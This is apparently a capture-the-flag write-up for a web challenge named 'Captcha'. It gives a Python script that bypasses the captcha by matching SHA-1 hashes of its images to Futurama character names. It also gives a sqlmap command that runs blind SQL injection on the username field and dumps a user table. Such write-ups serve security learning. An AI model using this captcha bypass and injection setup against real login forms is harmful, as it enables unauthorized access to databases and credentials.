@@ -1,0 +1,52 @@
+Captcha  - by wwwdata (via discord)
+
+The captcha web challenge was solved using a blind SQL injection in the username field. We basically cheated the captcha web challenge by writing a python script that solves the captcha and plugging it into SQLmap with the --preprocess option
+Script:
+
+import requests
+import xml.etree.ElementTree as ET
+import re
+import hashlib
+import webbrowser
+
+URL = 'https://captcha.ctf.zone/login.php'
+
+captcha_re = re.compile(r'<h3>Captcha</h3><img src="data:image/png;base64,([^"]+)"')
+characters = {
+        '911014279141779f88858e9ec975d55d53047583': 'wernstrom',
+        '28d829a55ced4bbef86ac1128d2919ab2eb8e6fc': 'elzar',
+        'fecdcf9de78b366be95e7814c8410134196db75a': 'nibbler',
+        '45daf2393f468e776e4b92e4736632e50e642ac6': 'robot devil',
+        '1a75d492b88f4fa9e196fdc923be5f34ddf9f17c': 'hermes',
+        '3e175a7c31acc5d69ad9e72dc129c2d74fa8cdc1': 'zoidberg',
+        'bc7829e8ddd113246c93f3becd3b79fce0dbf62d': 'calculon',
+        'a0f9c7a782dafe71e8061adfb5048bd1dcad2e0d': 'scruffy',
+        'c8e0c8155c1ab1b4ec24453f5b5870d1256196ec': 'clamps',
+        '01e85d89c5652c9f7960dd1ae4b29afed555eab2': 'lrrr',
+        '024d36dbd701baf746076f9316ea7f5597d14263': 'leela',
+        '0985a6b001e9df5633889d13378194b71eb3d205': 'bender',
+        '005733fb6699e5e733a7f336da8f0ad48b082476': 'mom',
+        '4d36ad53a882dccf922d8df64b832290c5c9e0a1': 'zapp',
+        '8b00e77a3bcff7ab6f717b68f398ddc173ebbbff': 'hypnotoad',
+        'e5189fa60528d0719563ce07b1deee38f9f5f781': 'amy',
+        'e182ba448697150f05f07c1ba15b59f67c85e051': 'morbo',
+        '3a309c5da84d6acde1cbd47f290eda49cb6e79cf': 'farnsworth',
+        '2e34d951fd266b8887714c91d19320f2f59ac8f7': 'fry',
+        'ba83bc30ecdd9f8b03d4cf45be76f803c7169c04': 'kif',
+        }
+
+def preprocess(req):
+    #print(req.headers)
+    if req.data:
+        with requests.Session() as sess:
+            r = sess.get(URL, headers=req.headers)
+            captcha = solve_captcha(r)
+            req.headers['Cookie'] = 'PHPSESSID='+sess.cookies['PHPSESSID']
+            req.data += b"&captcha="+captcha.encode()
+
+def solve_captcha(response):
+    match = captcha_re.search(response.text)
+    return characters[hashlib.sha1(match.group(1).encode()).hexdigest()]
+    
+
+sqlmap --dbms sqlite -u https://captcha.ctf.zone/login.php --data="user=user&pass=pass" -p user --preprocess=./captcha.py --level 5 --technique=B --risk 3 --random-agent -T userTable --dump
